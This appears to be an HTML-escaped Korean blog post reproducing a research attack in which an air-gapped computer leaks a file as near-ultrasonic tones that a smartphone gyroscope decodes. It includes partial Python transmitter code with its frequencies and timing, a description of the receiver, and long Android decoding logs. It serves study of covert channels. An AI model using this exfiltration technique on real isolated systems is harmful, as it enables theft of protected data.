&lt;h2 id=&quot;12-transmitter-air-gapped-computer&quot;&gt;1.2. Transmitter: Air-gapped computer&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;지정된 파일의 데이터를 읽어와 형식에 맞는 패킷을 만든다.
    &lt;ol&gt;
      &lt;li&gt;Preamble(4 bit) + Payload(8 bit) + Parity(1 bit)&lt;/li&gt;
      &lt;li&gt;Preamble은 1010으로, 이를 이용해 Receiver는 한 비트에 할당된 출력 시간을 인지하고, 뒤이어 패킷 바디가 들어올 것을 예상한다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;패킷의 바이너리를 미리 알아 둔 공진주파수에 대응시킨다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;해당 기능을 구현한 코드 부분(일부 잘라옴) :&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;paudio&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pyaudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PyAudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;vol&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;sr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48000&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;duration&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.625&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;mark_frequency&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20150&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# 1
&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space_frequency&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20400&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 0
&lt;/span&gt;    
 &lt;span class=&quot;c1&quot;&gt;# Read file and convert to binary data
&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;testfile&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;rb&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;binary_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;np&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpackbits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;np&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frombuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;np&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;binary_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;modulated_signals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modulate_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mark_frequency&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space_frequency&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;duration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
 &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modulated_signal&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modulated_signals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;ostream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;paudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pyaudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;paFloat32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;channels&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;ostream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modulated_signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tobytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;ostream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        
 &lt;span class=&quot;n&quot;&gt;paudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;일반적인 BFSK는 고주파를 1, 상대적 저주파를 0에 대응시키지만, 우리는 반대로 했다.
    &lt;ul&gt;
      &lt;li&gt;이하 ‘Carrier Frequency’&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;수신자 측의 CPU가 오차 없이 인식할 수 있는 시간 동안 Carrier Frequency를 쏴주기 위해, 부동소수점 표기로 정확히 표현이 가능한 0.625(\(101_{(2)}\)) 초를 Carrier Frequency 의 BitTime으로 결정했다.&lt;/li&gt;
  &lt;li&gt;발생하는 최고 주파수가 20400이므로, 이를 표현하기 위해서는 2배인 40800 이상의 샘플레이트가 필요하다. 따라서 샘플레이트는 48000Hz로 결정했다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;13-receiver-smartphone&quot;&gt;1.3. Receiver: Smartphone&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이쪽은 코드를 긁어와 설명하기엔 너무 길어서, 순서도로 기능을 설명한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/gyro/Untitled%208.png&quot; alt=&quot;Untitled&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이후 바이너리 데이터는 아스키 코드로 변환하여 앱의 화면에 보여준다.&lt;/p&gt;

&lt;p&gt;핸드폰을 책상 위에 놓고 스피커로 음파를 재생할 때, 자이로스코프 센서의 z축은 거의 영향을 받지 않고, x축과 y축이 크게 영향을 받는다는 점에 유념해 Magnitude를 구했다. 다만 논문과는 달리 데모를 재현한 우리 팀 특성상 x축과 y축의 magnitude 값을 합쳐 영향을 극대화해야 했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-결과-및-성능-평가&quot;&gt;2. 결과 및 성능 평가&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-데모-영상&quot;&gt;2.1. 데모 영상&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div style=&quot;position: relative; width: 100%; height: 0; overflow: hidden; padding-bottom: 80%;&quot;&gt;
&lt;iframe src=&quot;https://www.youtube.com/embed/MZGVMOy3WaA&quot; style=&quot;position: absolute; top:0; left:0; width: 80%; height: 80%; max-width: 1080px; max-height: 720px;&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-성능-평가&quot;&gt;2.2. 성능 평가&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;10cm 거리에서 N37WORk53CUR17Y! 를 전송한 결과 (1회차) - 에러율 0% 정확도 100%&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  2023-06-21 15:53:51.129  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 15:53:51.729  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 15:53:51.729  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 15:53:52.380  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 15:53:52.980  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:53:52.980  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:53:53.631  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:53:54.281  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:53:54.939  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:53:55.590  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:53:56.241  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:53:56.892  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:53:57.540  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:53:58.200  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:53:58.851  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:53:58.900  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01001110 = 78(N)
  2023-06-21 15:53:58.943  3194-3194  SH                      com.example.gyroscope                E  N
  2023-06-21 15:54:00.900  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:54:01.550  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:54:01.550  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:54:02.149  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:54:02.750  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:54:02.750  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:54:03.419  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:04.070  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:04.720  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:05.370  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:06.019  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:06.680  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:07.330  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:07.980  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:08.629  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:08.679  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110011 = 51(3)
  2023-06-21 15:54:08.722  3194-3194  SH                      com.example.gyroscope                E  3
  2023-06-21 15:54:10.731  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 15:54:11.330  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 15:54:11.330  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 15:54:11.981  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 15:54:12.579  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:54:12.579  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:54:13.230  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:13.880  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:14.529  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:15.190  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:15.840  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:16.489  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:17.140  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:17.789  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:18.449  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:18.500  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110111 = 55(7)
  2023-06-21 15:54:18.530  3194-3194  SH                      com.example.gyroscope                E  7
  2023-06-21 15:54:20.500  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:54:21.149  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:54:21.150  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:54:21.750  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:54:22.370  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:54:22.370  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:54:23.019  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:23.670  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:24.320  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:24.969  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:25.620  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:26.280  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:26.930  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:27.580  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:28.231  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:28.280  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01010111 = 87(W)
  2023-06-21 15:54:28.322  3194-3194  SH                      com.example.gyroscope                E  W
  2023-06-21 15:54:30.290  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:54:30.939  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:54:30.939  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:54:31.549  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:54:32.161  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:54:32.161  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:54:32.810  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:33.461  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:34.110  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:34.760  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:35.410  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:36.060  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:36.710  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:37.359  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:38.019  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:38.070  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110000 = 48(0)
  2023-06-21 15:54:38.117  3194-3194  SH                      com.example.gyroscope                E  0
  2023-06-21 15:54:40.140  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:54:40.740  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 12
  2023-06-21 15:54:40.740  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 15:54:41.350  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:54:41.900  3194-3194  SH                      com.example.gyroscope                D  bitlen : 12
  2023-06-21 15:54:41.900  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:54:42.500  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:43.100  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:43.700  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:44.309  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:44.910  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:45.510  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:46.110  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:46.710  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:47.310  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:47.360  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01010010 = 82(R)
  2023-06-21 15:54:47.411  3194-3194  SH                      com.example.gyroscope                E  R
  2023-06-21 15:54:47.610  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 5
  2023-06-21 15:54:48.010  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 8 5
  2023-06-21 15:54:49.913  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:54:50.560  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:54:50.560  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:54:51.159  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:54:51.760  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:54:51.761  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:54:52.410  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:53.069  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:53.720  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:54.370  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:55.020  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:55.670  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:54:56.320  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:56.969  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:57.629  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:54:57.679  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01101011 = 107(k)
  2023-06-21 15:54:57.710  3194-3194  SH                      com.example.gyroscope                E  k
  2023-06-21 15:54:59.730  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 15:55:00.380  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 13
  2023-06-21 15:55:00.380  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:55:00.980  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:55:01.589  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:55:01.589  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:55:02.249  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:02.899  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:03.559  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:04.210  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:04.870  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:05.520  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:06.170  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:06.820  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:07.470  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:07.520  3194-3194  SH                      com.example.gyroscope                E  Parity Check Failed
  2023-06-21 15:55:07.522  3194-3194  SH                      com.example.gyroscope                E  parseMessage: 
  2023-06-21 15:55:07.525  3194-3194  SH                      com.example.gyroscope                E  parseMessage: 
  2023-06-21 15:55:07.526  3194-3194  SH                      com.example.gyroscope                D  parseMessage:  = 0(??)
  2023-06-21 15:55:07.571  3194-3194  SH                      com.example.gyroscope                E  ??
  2023-06-21 15:55:09.530  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 15:55:10.139  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 15:55:10.139  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 15:55:10.740  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:55:11.340  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:55:11.340  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:55:11.989  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:12.639  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:13.309  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:13.959  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:14.639  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:15.289  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:15.939  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:16.589  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:17.239  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:17.289  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110101 = 53(5)
  2023-06-21 15:55:17.313  3194-3194  SH                      com.example.gyroscope                E  5
  2023-06-21 15:55:19.339  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 15:55:19.939  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 15:55:19.939  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 15:55:20.590  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 15:55:21.200  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:55:21.200  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:55:21.849  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:22.509  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:23.159  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:23.809  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:24.459  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:25.119  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:25.770  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:26.420  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:27.070  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:27.120  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110011 = 51(3)
  2023-06-21 15:55:27.169  3194-3194  SH                      com.example.gyroscope                E  3
  2023-06-21 15:55:29.120  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:55:29.769  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:55:29.769  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:55:30.370  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
